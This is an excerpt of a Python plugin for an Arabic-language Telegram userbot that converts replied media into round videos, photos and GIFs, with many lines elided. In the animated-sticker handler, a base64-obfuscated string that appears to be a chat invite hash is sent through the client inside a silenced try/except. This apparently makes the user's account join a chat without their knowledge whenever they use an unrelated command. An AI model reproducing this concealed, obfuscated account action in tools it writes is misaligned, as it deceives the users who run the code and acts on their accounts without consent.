...
@jmthon.ar_cmd(
    pattern="سبين(?: |$)((-)?(s)?)$",
    command=("سبين", plugin_category),
    info={
        "header": "لتحويل الصورة أو الملصق الذي تم الرد عليه إلى فيديو دائري.",
        "usage": [
            "{tr}سبين",
        ],
        "مثال": ["{tr}سبين"],
...
async def pic_gifcmd(event):  # sourcery no-metrics
    "لتحويل الصورة أو الملصق الذي تم الرد عليه إلى الدوران حول الفيديو."
    args = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "يجب الرد على الوسائط المدعومة...")
    media_type(reply)
    jmthonevent = await edit_or_reply(event, "**- يتم المعالجه انتظر قليلا** .....")
    output = await _jmthontools.media_to_pic(event, reply, noedits=True)
    if output[1] is None:
        return await edit_delete(
            output[0], "- يرجى استخدام  الامر بشكل صحيح"
        )
    ...
    if output is None:
        return await edit_delete(jmthonevent, "__غير قادر على جعل تدور gif.__")
...
async def video_jmthonfile(event):  # sourcery no-metrics
    ...
    flag = True
    jmthonevent = await edit_or_reply(event, "`Converting to round format..........`")
    ...
    if mediatype in ["Gif", "Video", "Sticker"]:
        ...
        if jmthonthumb is not None and os.path.exists(jmthonthumb):
            ...
            os.remove(jmthonfile)
            return await edit_delete(
                jmthonevent, "`No thumb found to make it video note`", 5
            )
    if mediatype in [
        "Voice",
        "Audio",
...
async def on_file_to_photo(event):
    ...
    jmthont = await edit_or_reply(event, "`Converting.....`")
...
async def _(event):  # sourcery no-metrics
    ...
    jmthon_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not jmthonreply or not jmthonreply.media or not jmthonreply.media.document:
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    if jmthonreply.media.document.mime_type != "application/x-tgsticker":
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    ...
    try:
        jmthon_event = Get(jmthon_event)
        await event.client(jmthon_event)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    jmthonfile = await event.client.download_media(jmthonreply)
    jmthongif = await make_gif(event, jmthonfile, quality, fps)
    sandy = await event.client.send_file(
        event.chat_id,
        jmthongif,
...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    jmthonevent = await edit_or_reply(event, "__🎞 Making Gif from the relied media...__")
    imag = await _jmthontools.media_to_pic(event, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
    ...
    try:
        ...
        return await edit_delete(jmthonevent, f"**Error**\n__{e}__")
    output = io.BytesIO()
    output.name = "Output.gif"
    ...
    if output is None:
        await edit_delete(
            jmthonevent, "__There was some error in the media. I can't format it to gif.__"
        )
...
async def _(event):
    ...
    if not args:
        ...
        try:
            ...
            args = 2.0
    jmthonevent = await edit_or_reply(event, "__🎞Converting into Gif..__")
